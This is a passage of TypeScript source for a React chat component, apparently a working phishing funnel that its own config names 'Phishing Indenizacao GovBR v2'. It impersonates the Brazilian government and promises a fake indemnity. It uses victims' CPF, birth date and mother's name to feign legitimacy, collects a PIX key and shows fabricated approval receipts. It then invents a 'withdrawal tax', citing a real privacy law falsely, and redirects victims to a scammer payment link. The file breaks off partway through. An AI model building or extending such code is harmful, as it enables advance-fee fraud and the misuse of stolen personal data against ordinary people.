
"use client";

import React, { useState, useEffect, useRef, FC } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';

export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
}

interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'setChavePixToUserCPF' | 'redirectToPayment';
  paymentUrl?: string;
  style?: string;
}

interface FlowStepDataDisplayVideo {
  message?: string;
  videoUrl: string;
  thumbnailText?: string;
}

interface FlowStepDataMultipleChoice {
  message: string;
  options: ChatOption[];
  note?: string;
  style?: string;
}

interface FlowStepDataLoading {
  message: string;
  duration_ms: number;
}

interface FlowStepDataDisplayMessage {
  title?: string;
  icon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
  message?: string;
  details?: Record<string, string>;
  audioUrl?: string;
  note?: string;
}

interface FlowStepDataTextInput {
  message: string;
  placeholder: string;
  variableToSet: 'chavePix';
  validation?: 'br_phone' | 'email' | 'alphanumeric_with_hyphens';
}

interface FlowStepDataDisplayDynamicImage {
    message: string;
    templateUrl?: string; // Placeholder for potential future use with actual image generation
    dataMapping?: any[]; // Placeholder
    imageAiHint?: string; // For future AI generation
    imageAltText?: string; // For accessibility
}

interface FlowStep {
  type: 'displayVideo' | 'multipleChoice' | 'loading' | 'displayMessage' | 'textInput' | 'displayDynamicImage';
  delay_ms?: number;
  data: FlowStepDataDisplayVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayDynamicImage;
  nextStep?: string;
  isTerminal?: boolean;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[];
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
}

const funnelDefinition: {
  funnelName: string;
  initialStep: string;
  globalVariables: Record<string, string>;
  steps: Record<string, FlowStep>;
} = {
  "funnelName": "Phishing Indenizacao GovBR v2",
  "initialStep": "step1_video",
  "globalVariables": {
    "indenizacaoValor": "R$ 5.960,50",
    "taxaValor": "R$ 61,90",
    "paymentLink": "https://site-do-golpista.com/checkout-pix"
  },
  "steps": {
    "step1_video": {
      "type": "displayVideo",
      "delay_ms": 1000,
      "data": {
        "message": "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4", // Updated URL
        "thumbnailText": "Clique para Assistir e Iniciar"
      },
      "nextStep": "step2_intro_and_ask_mother"
    },
    "step2_intro_and_ask_mother": {
      "type": "multipleChoice",
      "delay_ms": 2500,
      "data": {
        "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.\n\nResponda às perguntas a seguir para aprovação do seu saque de {{indenizacaoValor}}.\n\nPor favor, confirme o nome de sua mãe.",
        "options": [
          {"text": "{{randomMotherName1}}", "nextStep": "step3_ask_civil_status"},
          {"text": "{{randomMotherName2}}", "nextStep": "step3_ask_civil_status"},
          {"text": "{{userMotherName}}", "nextStep": "step3_ask_civil_status"},
          {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_civil_status"}
        ]
      }
    },
    "step3_ask_civil_status": {
      "type": "multipleChoice",
      "delay_ms": 1500,
      "data": {
        "message": "Qual seu estado civil?",
        "options": [
          {"text": "Solteiro (a)", "nextStep": "step4_loading_validation"},
          {"text": "Casado (a)", "nextStep": "step4_loading_validation"},
          {"text": "Divorciado (a)", "nextStep": "step4_loading_validation"},
          {"text": "Viúvo (a)", "nextStep": "step4_loading_validation"}
        ]
      }
    },
    "step4_loading_validation": {
      "type": "loading",
      "delay_ms": 500,
      "data": {
        "message": "Validando suas respostas...",
        "duration_ms": 3000
      },
      "nextStep": "step5_confirmation_and_audio"
    },
    "step5_confirmation_and_audio": {
      "type": "displayMessage",
      "delay_ms": 500,
      "data": {
        "title": "Autenticidade confirmada!",
        "icon": "success_checkmark",
        "details": {
          "Nome": "{{userName}}",
          "CPF": "{{userCPF}}",
          "Data de Nascimento": "{{userBirthDate}}",
          "Indenização": "{{indenizacaoValor}}",
          "Status": "Pré-aprovado"
        },
        "audioUrl": "https://url-do-golpista.com/audios/confirmacao_aprovada.mp3"
      },
      "nextStep": "step6_ask_pix_type"
    },
    "step6_ask_pix_type": {
      "type": "multipleChoice",
      "delay_ms": 2500,
      "data": {
        "message": "Para prosseguir, selecione a chave PIX que deseja usar para o recebimento:",
        "options": [
          {"text": "Telefone", "nextStep": "step7_input_pix_key", "action": "setChavePixToUserCPF"}, // Action added for CPF default
          {"text": "CPF (recomendado)", "nextStep": "step7_confirm_pix_key", "action": "setChavePixToUserCPF"},
          {"text": "Email", "nextStep": "step7_input_pix_key", "action": "setChavePixToUserCPF"}, // Action added for CPF default
          // {"text": "Outra chave", "nextStep": "step7_input_pix_key"} // Example of text input step
        ]
      }
    },
    "step7_confirm_pix_key": { // This step confirms if the CPF is the PIX key
      "type": "multipleChoice",
      "delay_ms": 1500,
      "data": {
        "message": "ATENÇÃO: Verifique se a chave Pix (seu CPF) está correta.\n\nChave: {{chavePix}}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
        "options": [
          {"text": "Sim, está correto.", "nextStep": "step8_loading_pix_registration"},
          {"text": "Não, desejo usar outra chave.", "nextStep": "step7_input_pix_key"}
        ]
      }
    },
    "step7_input_pix_key": { // New step for manual PIX key input
      "type": "textInput",
      "delay_ms": 1000,
      "data": {
          "message": "Por favor, digite sua chave PIX:",
          "placeholder": "Digite sua chave PIX aqui",
          "variableToSet": "chavePix"
      },
      "nextStep": "step7b_confirm_manual_pix_key"
    },
    "step7b_confirm_manual_pix_key": { // New step to confirm manually entered PIX key
        "type": "multipleChoice",
        "delay_ms": 1500,
        "data": {
            "message": "ATENÇÃO: Verifique se a chave Pix está correta.\n\nChave: {{chavePix}}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
            "options": [
                {"text": "Sim, está correto.", "nextStep": "step8_loading_pix_registration"},
                {"text": "Não, desejo corrigir.", "nextStep": "step7_input_pix_key"}
            ]
        }
    },
    "step8_loading_pix_registration": {
      "type": "loading",
      "delay_ms": 500,
      "data": {
        "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...",
        "duration_ms": 2500
      },
      "nextStep": "step9_pix_registered_and_audio"
    },
    "step9_pix_registered_and_audio": {
      "type": "displayMessage",
      "delay_ms": 500,
      "data": {
        "title": "Chave PIX Cadastrada",
        "icon": "success_checkmark",
        "message": "Sua chave pix foi cadastrada com sucesso!",
        "details": {
          "Nome": "{{userName}}",
          "Chave Pix": "{{chavePix}}",
          "Status": "Aprovado"
        },
        "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
      },
      "nextStep": "step10_ask_generate_receipt"
    },
    "step10_ask_generate_receipt": {
      "type": "multipleChoice",
      "delay_ms": 3500,
      "data": {
        "message": "Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave PIX informada.\n\nIremos gerar seu comprovante do valor de {{indenizacaoValor}} neste instante.",
        "options": [
          {"text": "Desejo receber meu comprovante de recebimento.", "nextStep": "step11_generating_receipt_image"}
        ]
      }
    },
    "step11_generating_receipt_image": {
      "type": "displayDynamicImage", // Simplified to behave like displayMessage
      "delay_ms": 1000,
      "data": {
        "message": "Gerando seu comprovante de recebimento dos valores...",
        // TemplateUrl and dataMapping are placeholders for now.
        // Fallback to a simple message if image generation fails or is not implemented.
        "templateUrl": "https://images.converteai.net/f450a168-0579-4c26-a217-5937b085c4d2/microsoftteams-image-19.png", // Example generic receipt
        "imageAiHint": "official receipt",
        "imageAltText": "Comprovante de Indenização Gov.BR"
      },
      "nextStep": "step12_reveal_tax_and_audio"
    },
    "step12_reveal_tax_and_audio": {
      "type": "displayMessage",
      "delay_ms": 3000,
      "data": {
        "title": "Indenização Governamental",
        "details": {
          "Indenização disponível para saque": "{{indenizacaoValor}}",
          "Titular": "{{userName}}",
          "Chave Pix": "{{chavePix}}",
          "Imposto de Saque": "{{taxaValor}}"
        },
        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
      },
      "nextStep": "step13_final_justification_and_cta"
    },
    "step13_final_justification_and_cta": {
      "type": "multipleChoice",
      "delay_ms": 4000,
      "data": {
        "message": "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo.\n\nPortanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.\n\nLei n.º 13.709 de 14 de agosto de 2018",
        "options": [
          {
            "text": "Concluir pagamento e receber minha indenização",
            "action": "redirectToPayment",
            "paymentUrl": "{{paymentLink}}"
          }
        ]
      }
    }
  }
};


const STORAGE_KEY_MESSAGES = 'simulatedChatMessages_v2_1';
const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey_v2_1';
const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables_v2_1';
const STORAGE_KEY_SESSION_CPF = 'simulatedChatSessionCpf_v2_1'; // Unique key for session identifier

const DEFAULT_APPEARANCE_DELAY_MS = 500; // Fallback if step has no delay_ms

const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);

  const [flowVariables, setFlowVariables] = useState<Record<string, any>>(() => {
    const initialGlobalVars = funnelDefinition.globalVariables || {};
    return {
        ...initialGlobalVars,
        dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
        userName: initialParams.nome || 'Usuário',
        userCPF: initialParams.cpf || '---.---.---.--',
        userBirthDate: initialParams.nascimento || '--/--/----',
        userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
        randomMotherName1: 'Maria da Silva Souza', // Placeholder, can be randomized further if needed
        randomMotherName2: 'Joana Oliveira Costa', // Placeholder
        chavePix: initialParams.cpf || '---.---.---.--', // Default PIX key to user's CPF
    };
  });

  const [isBotTyping, setIsBotTyping] = useState(false);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);

  const [showVideoPlaceholderOverlay, setShowVideoPlaceholderOverlay] = useState(true);
  const videoPlaceholderData = useRef<FlowStepDataDisplayVideo | null>(null);
  const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);

  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);

  const [isTextInputActive, setIsTextInputActive] = useState(false);
  const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
  const [textInputValue, setTextInputValue] = useState("");

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);
  const justLoadedSessionRef = useRef(false);


  useEffect(() => {
    if (typeof window === 'undefined') return;

    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome; // Using name as part of unique session key
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    const storedSessionIdentifier = sessionStorage.getItem(STORAGE_KEY_SESSION_CPF);

    let shouldResetChat = false;

    // Prepare default flow variables based on initialParams and funnelDefinition
    const defaultGlobalVars = funnelDefinition.globalVariables || {};
    const defaultFlowVars = {
        ...defaultGlobalVars,
        dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
        userName: initialParams.nome || 'Usuário',
        userCPF: initialParams.cpf || '---.---.---.--',
        userBirthDate: initialParams.nascimento || '--/--/----',
        userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
        randomMotherName1: 'Maria da Silva Souza',
        randomMotherName2: 'Joana Oliveira Costa',
        chavePix: initialParams.cpf || '---.---.---.--', // Default to user's CPF
    };

    if (currentCpfFromParams && storedSessionIdentifier === sessionIdentifier) {
      const savedMessages = sessionStorage.getItem(STORAGE_KEY_MESSAGES);
      const savedStep = sessionStorage.getItem(STORAGE_KEY_STEP);
      const savedFlowVars = sessionStorage.getItem(STORAGE_KEY_VARIABLES);

      setMessages(savedMessages ? JSON.parse(savedMessages) : []);
      const stepToSet = (savedStep && funnelDefinition.steps[JSON.parse(savedStep)])
                         ? JSON.parse(savedStep)
                         : funnelDefinition.initialStep;
      setCurrentStepKey(stepToSet);

      // Merge saved variables with defaults, giving precedence to saved ones where appropriate
      const newFlowVariables = { ...defaultFlowVars };
      if (savedFlowVars) {
        const parsedSaved = JSON.parse(savedFlowVars);
        newFlowVariables.chavePix = parsedSaved.chavePix || defaultFlowVars.chavePix;
        // Add other variables from globalVariables if they were part of savedFlowVars structure
        Object.keys(defaultGlobalVars).forEach(key => {
            if (parsedSaved[key] !== undefined) newFlowVariables[key] = parsedSaved[key];
        });
      }
      setFlowVariables(newFlowVariables);
      justLoadedSessionRef.current = (savedMessages && savedMessages !== "[]"); // Considered loaded if there are messages
    } else {
      shouldResetChat = true;
    }

    if (shouldResetChat) {
      sessionStorage.removeItem(STORAGE_KEY_MESSAGES);
      sessionStorage.removeItem(STORAGE_KEY_STEP);
      sessionStorage.removeItem(STORAGE_KEY_VARIABLES);

      if (currentCpfFromParams) { // Set new session identifier only if CPF is present
        sessionStorage.setItem(STORAGE_KEY_SESSION_CPF, sessionIdentifier);
      } else {
        sessionStorage.removeItem(STORAGE_KEY_SESSION_CPF); // Clear if no CPF
      }

      setMessages([]);
      setCurrentStepKey(funnelDefinition.initialStep);
      setFlowVariables(defaultFlowVars); // Reset to default variables
      prevCurrentStepKeyRef.current = undefined; // Critical for isNewStep logic on reset
      justLoadedSessionRef.current = false;
    }
  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]); // Add all relevant initialParams

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      sessionStorage.setItem(STORAGE_KEY_MESSAGES, JSON.stringify(messages));
    }
  }, [messages, initialParams.cpf, initialParams.nome]);

  useEffect(() => {
     if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      sessionStorage.setItem(STORAGE_KEY_STEP, JSON.stringify(currentStepKey));
    }
  }, [currentStepKey, initialParams.cpf, initialParams.nome]);

  useEffect(() => {
    if (typeof window === 'undefined') return;
    const currentCpfFromParams = initialParams.cpf;
    const currentNameFromParams = initialParams.nome;
    const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
    if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
      // Persist all flowVariables that might change or are part of globalVariables
      const persistableFlowVariables: Record<string, any> = {};
      Object.keys(flowVariables).forEach(key => {
        if (key in funnelDefinition.globalVariables || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName'].includes(key)) {
            persistableFlowVariables[key] = flowVariables[key];
        }
      });
      sessionStorage.setItem(STORAGE_KEY_VARIABLES, JSON.stringify(persistableFlowVariables));
    }
  }, [flowVariables, initialParams.cpf, initialParams.nome]);


  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    let formattedText = text;
    // Combine initialParams, globalVariables from funnelDefinition, and dynamic flowVariables
    const allVars = {
        ...initialParams, // Raw params from URL
        ...(funnelDefinition.globalVariables || {}), // Static global vars from funnel definition
        ...flowVariables, // Dynamic state variables (includes formatted userName, userCPF etc.)
    };

    for (const key in allVars) {
      const placeholder = `{{${key}}}`;
      let valueToInsert = String(allVars[key]);

      // Ensure value is not "null" or "undefined" string before inserting
      if (valueToInsert !== undefined && valueToInsert !== null && valueToInsert.toLowerCase() !== "null" && valueToInsert.toLowerCase() !== "undefined") {
        // Specific formatting for CPF and dates if they are in raw format
        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) { // Raw 11-digit CPF
            valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { // YYYY-MM-DD or ISO
            const datePart = valueToInsert.split('T')[0];
            const parts = datePart.split('-');
            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`; // to DD/MM/YYYY
        }
        // For names (userName, userMotherName), apply title case if not already formatted
        else if ((key === 'userName' || key === 'userMotherName') && valueToInsert === valueToInsert.toLowerCase()) {
             valueToInsert = valueToInsert
                .split(' ')
                .map(word => word.charAt(0).toUpperCase() + word.slice(1))
                .join(' ');
        }
        formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
      } else {
         // If a variable is undefined or null, replace placeholder with a default like '---' or empty string
         formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), '---');
      }
    }
    return formattedText;
  };

  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[formatText(key)] = formatText(details[key]);
    }
    return formatted;
  };

  const handleUserActionAndNavigate = (nextStepKey?: string) => {
    if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
    }
    // Clear UI elements that persist across steps
    setCurrentDisplayMessage(null);
    setCurrentImageDetails(null);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    // Video placeholder is handled by its own logic or cleared if step type changes
    if (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.type !== 'displayVideo') {
        videoPlaceholderData.current = null;
        setCurrentVideoMessage(null);
    }
    setIsTextInputActive(false); // Ensure text input is cleared on any navigation
    setCurrentTextInputConfig(null);

    if (nextStepKey && funnelDefinition.steps[nextStepKey as keyof typeof funnelDefinition.steps]) {
        setCurrentStepKey(nextStepKey);
    } else if (nextStepKey) {
        console.error("SimulatedChatFlow: Invalid nextStepKey referenced:", nextStepKey);
        // Potentially add a bot message about an error if this happens in production
    }
  };

  useEffect(() => {
    if (typeof window === 'undefined') return;

    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep | undefined;

    if (!stepConfig) {
      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
      // Only add error message if it's a new invalid step and not from session load
      if (prevCurrentStepKeyRef.current !== currentStepKey && !justLoadedSessionRef.current) {
        setMessages(prev => [...prev, {id: `err-invalid-step-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro interno no fluxo."}]);
      }
      setIsBotTyping(false); // Ensure typing stops if step is invalid
      return;
    }

    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
    // processAsNewStep determines if we should add new messages/UI for the current step
    // It's true if it's a genuinely new step (not from session load),
    // OR if it's a video step being loaded from session (to ensure video placeholder always appears).
    let processAsNewStep = (isNewStep && !justLoadedSessionRef.current) ||
                           (justLoadedSessionRef.current && stepConfig.type === 'displayVideo' && isNewStep);

    // Clear persistent UI elements if it's a new step that's not a video being reloaded from session
    if (isNewStep && !(justLoadedSessionRef.current && stepConfig.type === 'displayVideo')) {
      setIsLoadingStep(false);
      setLoadingMessage(null);
      setCurrentImageDetails(null);
      setCurrentDisplayMessage(null);
      setIsTextInputActive(false);
      setCurrentTextInputConfig(null);
      if (stepConfig.type !== 'displayVideo') {
        videoPlaceholderData.current = null;
        setCurrentVideoMessage(null);
      }
    }
    
    // Start typing if we are about to process new content or if it's a step that requires user input.
    // Avoid typing if just loaded from session and it's not an interactive step or video.
    if (processAsNewStep || (isNewStep && (stepConfig.type === 'multipleChoice' || stepConfig.type === 'textInput'))) {
        setIsBotTyping(true);
    }


    const effectiveAppearanceDelay = stepConfig?.delay_ms ?? DEFAULT_APPEARANCE_DELAY_MS;

    const typingTimer = setTimeout(() => {
      const processStepAfterDelayInternal = async () => {
        if (processAsNewStep) {
          switch (stepConfig.type) {
            case 'displayVideo': {
              const data = stepConfig.data as FlowStepDataDisplayVideo;
              videoPlaceholderData.current = { ...data, thumbnailText: data.thumbnailText || "Clique para Assistir" };
              setCurrentVideoMessage(formatText(data.message));
              setShowVideoPlaceholderOverlay(true);
              // For video, bot stops typing after message is shown, awaits user click
              setIsBotTyping(false);
              return;
            }
            case 'multipleChoice': {
              const data = stepConfig.data as FlowStepDataMultipleChoice;
              const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
              setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
              break;
            }
            case 'loading': {
              const data = stepConfig.data as FlowStepDataLoading;
              setLoadingMessage(formatText(data.message));
              setIsLoadingStep(true);
              // Loading step manages its own "end of typing" via its duration
              autoTransitionTimerRef.current = setTimeout(() => {
                if (prevCurrentStepKeyRef.current === currentStepKey) { // Ensure step hasn't changed
                  setIsLoadingStep(false);
                  setLoadingMessage(null);
                  if (stepConfig.nextStep) handleUserActionAndNavigate(stepConfig.nextStep);
                }
              }, data.duration_ms);
              // Bot stops typing when loading message appears
              setIsBotTyping(false);
              return;
            }
            case 'displayMessage': {
              const data = stepConfig.data as FlowStepDataDisplayMessage;
              const displayMsgData: Message = {
                id: `bot-msg-${Date.now()}`, sender: 'bot',
                displayTitle: formatText(data.title),
                text: data.message ? formatText(data.message) : undefined,
                displayDetails: formatDetailsObject(data.details),
                displayIcon: data.icon,
              };
              setCurrentDisplayMessage(displayMsgData);
              if (data.audioUrl && audioRef.current) {
                audioRef.current.src = data.audioUrl;
                audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
              }
              break;
            }
            case 'textInput': {
              const data = stepConfig.data as FlowStepDataTextInput;
              setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
              setCurrentTextInputConfig(data);
              setIsTextInputActive(true);
              setTextInputValue("");
              // For text input, bot stops typing, awaits user input
              setIsBotTyping(false);
              return;
            }
            case 'displayDynamicImage': {
              const data = stepConfig.data as FlowStepDataDisplayDynamicImage;
              console.warn("SimulatedChatFlow: 'displayDynamicImage' step type is simplified. Actual image generation with text overlay is not implemented. Displaying message and fallback image if URL provided.");
              const messageToShow = formatText(data.message) || "Gerando seu comprovante...";
              if (data.templateUrl) { // If a URL is provided, use it as a static image
                setCurrentImageDetails({
                    url: data.templateUrl,
                    alt: formatText(data.imageAltText) || "Comprovante",
                    message: messageToShow,
                    aiHint: data.imageAiHint
                });
              } else { // Otherwise, just show the message
                setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
              }
              break;
            }
            default:
              console.error("SimulatedChatFlow: Unknown step type in processAsNewStep:", (stepConfig as any).type);
              setMessages(prev => [...prev, {id: `err-type-new-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
          }
        } else if (isNewStep && justLoadedSessionRef.current) {
          // Logic for re-rendering UI for a step loaded from session (if not video)
          // Typically, multipleChoice and textInput need their UI re-established
          if (stepConfig.type === 'multipleChoice') {
            const lastMessage = messages[messages.length - 1];
            const data = stepConfig.data as FlowStepDataMultipleChoice;
            const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
            // Check if the last message is not already this bot's options message
            if (!lastMessage || lastMessage.sender === 'user' ||
                (lastMessage.text !== formatText(data.message) || JSON.stringify(lastMessage.options) !== JSON.stringify(formattedOptions))) {
               setMessages(prev => [...prev, { id: `bot-session-load-opts-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
            }
          } else if (stepConfig.type === 'textInput') {
            setCurrentTextInputConfig(stepConfig.data as FlowStepDataTextInput);
            setIsTextInputActive(true);
            const lastMessage = messages[messages.length - 1];
             if(!lastMessage || lastMessage.sender === 'user' || lastMessage.text !== formatText((stepConfig.data as FlowStepDataTextInput).message)) {
                setMessages(prev => [...prev, { id: `bot-session-load-text-input-${Date.now()}`, sender: 'bot', text: formatText((stepConfig.data as FlowStepDataTextInput).message) }]);
             }
          } else if (stepConfig.type === 'displayMessage'){
              const data = stepConfig.data as FlowStepDataDisplayMessage;
               const displayMsgData: Message = {
                id: `bot-session-load-disp-${Date.now()}`, sender: 'bot',
                displayTitle: formatText(data.title),
                text: data.message ? formatText(data.message) : undefined,
                displayDetails: formatDetailsObject(data.details),
                displayIcon: data.icon,
              };
              setCurrentDisplayMessage(displayMsgData);
          }  else if (stepConfig.type === 'displayDynamicImage') {
              const data = stepConfig.data as FlowStepDataDisplayDynamicImage;
              const messageToShow = formatText(data.message) || "Gerando comprovante...";
               if (data.templateUrl) {
                    setCurrentImageDetails({
                        url: data.templateUrl,
                        alt: formatText(data.imageAltText) || "Comprovante",
                        message: messageToShow,
                        aiHint: data.imageAiHint
                    });
                } else {
                    const lastMessage = messages[messages.length - 1];
                    if(!lastMessage || lastMessage.sender === 'user' || lastMessage.text !== messageToShow) {
                        setMessages(prev => [...prev, { id: `bot-session-load-dynimg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
                    }
                }
          }
        } else { // Not a new step, not just loaded from session (e.g., re-render due to flowVariables change)
          // Update existing UI elements like displayMessage if flowVariables it depends on have changed
          if (currentDisplayMessage) {
             const data = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage;
              if (data && data.type === 'displayMessage') { // Ensure it's still a displayMessage
                   setCurrentDisplayMessage(prev => prev ? {
                      ...prev,
                      displayTitle: formatText(data.title),
                      text: data.message ? formatText(data.message) : undefined,
                      displayDetails: formatDetailsObject(data.details),
                  } : null);
              }
          }
          if (messages.length > 0 && !isTextInputActive && !videoPlaceholderData.current && !isLoadingStep && !currentDisplayMessage && !currentImageDetails) {
              const lastMessage = messages[messages.length -1];
              if (lastMessage.sender === 'bot' && lastMessage.options && stepConfig.type === 'multipleChoice') {
                   const data = stepConfig.data as FlowStepDataMultipleChoice;
                   if (data && data.options) {
                       setMessages(prevMsgs => prevMsgs.map((msg, index) => {
                          if (index === prevMsgs.length -1) {
                              return { ...msg, text: formatText(data.message), options: data.options.map(opt => ({ ...opt, text: formatText(opt.text) })) };
                          }
                          return msg;
                       }));
                   }
              } else if (lastMessage.sender === 'bot' && !lastMessage.options && (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage')) {
                  const data = stepConfig.data as (FlowStepDataDisplayMessage | FlowStepDataDisplayDynamicImage);
                  // Only update simple text message if no complex display elements are active
                  if (data && data.message && !(data as FlowStepDataDisplayMessage).title && !(data as FlowStepDataDisplayMessage).details && stepConfig.type !== 'displayDynamicImage') {
                       setMessages(prevMsgs => prevMsgs.map((msg, index) => {
                          if (index === prevMsgs.length -1) { return { ...msg, text: formatText(data.message!) }; }
                          return msg;
                       }));
                  }
              }
          }
        }

        // Auto-transition logic for non-interactive steps (displayMessage, displayDynamicImage)
        const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                  (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage');

        let nextStepTransitionDelayMs = stepConfig.type === 'displayMessage' ? 4500 : (stepConfig.type === 'displayDynamicImage' ? 3000 : 0);
        if (stepConfig.type === 'displayMessage' && !(stepConfig.data as FlowStepDataDisplayMessage).details) {
            nextStepTransitionDelayMs = (stepConfig.data as FlowStepDataDisplayMessage).message ? 2500 : 1200;
        }


        if (canAutoTransition && (processAsNewStep || (isNewStep && justLoadedSessionRef.current))) {
          autoTransitionTimerRef.current = setTimeout(() => {
            if (prevCurrentStepKeyRef.current === currentStepKey) { // Ensure step hasn't changed by user action
               handleUserActionAndNavigate(stepConfig.nextStep as string);
            }
          }, nextStepTransitionDelayMs);
        }
        // Stop typing after content is processed, unless it's a step that waits for user (video, textInput, loading)
        if (stepConfig.type !== 'videoDisplay' && stepConfig.type !== 'textInput' && stepConfig.type !== 'loading') {
            setIsBotTyping(false);
        }
      }; // End of processStepAfterDelayInternal

      processStepAfterDelayInternal();

    }, effectiveAppearanceDelay); // End of typingTimer setTimeout

    // Update refs at the end of the synchronous part of useEffect
    if (isNewStep && !justLoadedSessionRef.current) {
      prevCurrentStepKeyRef.current = currentStepKey;
    }
    if (justLoadedSessionRef.current && isNewStep) {
        // Set to false after this new step (loaded from session) has been processed once by this effect
        justLoadedSessionRef.current = false;
    }

    return () => {
      clearTimeout(typingTimer);
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
    };
  }, [currentStepKey, initialParams, flowVariables]); // flowVariables re-triggers for dynamic text updates

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
